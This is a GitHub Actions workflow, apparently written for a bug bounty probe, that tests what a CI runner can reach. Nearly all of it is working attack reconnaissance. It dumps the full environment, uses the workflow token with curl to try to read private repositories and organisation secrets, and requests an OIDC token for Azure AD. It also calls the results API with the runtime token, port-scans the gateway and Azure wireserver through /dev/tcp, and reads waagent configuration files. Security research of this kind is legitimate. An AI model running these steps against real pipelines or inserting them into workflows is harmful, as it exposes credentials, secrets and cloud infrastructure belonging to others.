name: Artifact & Token Test
on:
  workflow_dispatch:

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Create sensitive artifact
        run: |
          mkdir -p artifact
          echo "SENSITIVE_DATA_FROM_NOWSH_TEST1" > artifact/secret.txt
          echo "subscription: d02811a5-f53f-423f-9311-36d15ba9085f" >> artifact/secret.txt
          
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: test-artifact
          path: artifact/

      - name: Dump full environment
        run: |
          echo "============================================"
          echo "ENVIRONMENT VARIABLES (sorted)"
          echo "============================================"
          env | sort
          echo ""
          
      - name: GITHUB_TOKEN scope test
        run: |
          echo "============================================"
          echo "GITHUB_TOKEN PERMISSIONS"
          echo "============================================"
          # Try to read private repo content
          curl -s -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.com/repos/nowsh-test1/bounty-test-private/contents/" 2>&1 | head -5
          echo ""
          
          # Try to list other repos
          curl -s -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.com/user/repos?type=private&per_page=5" 2>&1 | head -10
          echo ""
          
          # Token scopes
          curl -s -I -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.com/" 2>&1 | grep -iE 'x-oauth-scopes|x-accepted|x-ratelimit-limit'
          echo ""
          
          # Try to access org secrets
          curl -s -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.com/repos/nowsh-test1/actions-test/actions/secrets" 2>&1
          echo ""
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: ACTIONS_RUNTIME_TOKEN analysis
        run: |
          echo "============================================"
          echo "ACTIONS RUNTIME TOKEN"
          echo "============================================"
          echo "ACTIONS_RUNTIME_TOKEN length: ${#ACTIONS_RUNTIME_TOKEN}"
          echo "ACTIONS_RUNTIME_URL: $ACTIONS_RUNTIME_URL"
          echo "ACTIONS_ID_TOKEN_REQUEST_URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN length: ${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
          echo "ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
          echo ""
          
          # Try to request OIDC token
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            echo "=== OIDC Token Request ==="
            curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 2>&1 | head -20
            echo ""
          fi
          
          # Try results API
          if [ -n "$ACTIONS_RESULTS_URL" ]; then
            echo "=== Results API ==="
            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
              "${ACTIONS_RESULTS_URL}" 2>&1 | head -5
            echo ""
          fi

      - name: Internal network port scan
        run: |
          echo "============================================"
          echo "PORT SCAN - Gateway (10.1.0.1)"
          echo "============================================"
          for port in 80 443 8080 8443 9090 6443 2379 2380 3000 5000 8000 8888; do
            (timeout 2 bash -c "echo >/dev/tcp/10.1.0.1/$port" 2>/dev/null && echo "10.1.0.1:$port OPEN") || true
          done
          echo ""
          
          echo "============================================"
          echo "PORT SCAN - Azure wireserver (168.63.129.16)"
          echo "============================================"
          for port in 80 443 32526; do
            (timeout 2 bash -c "echo >/dev/tcp/168.63.129.16/$port" 2>/dev/null && echo "168.63.129.16:$port OPEN") || true
          done
          echo ""
          
          echo "============================================"
          echo "WAAGENT FILES"
          echo "============================================"
          ls -la /var/lib/waagent/ 2>&1 | head -30 || echo "No waagent dir"
          echo ""
          cat /var/lib/waagent/SharedConfig.xml 2>&1 | head -50 || echo "No SharedConfig"
          echo ""
          
          echo "============================================"  
          echo "DONE"
          echo "============================================"
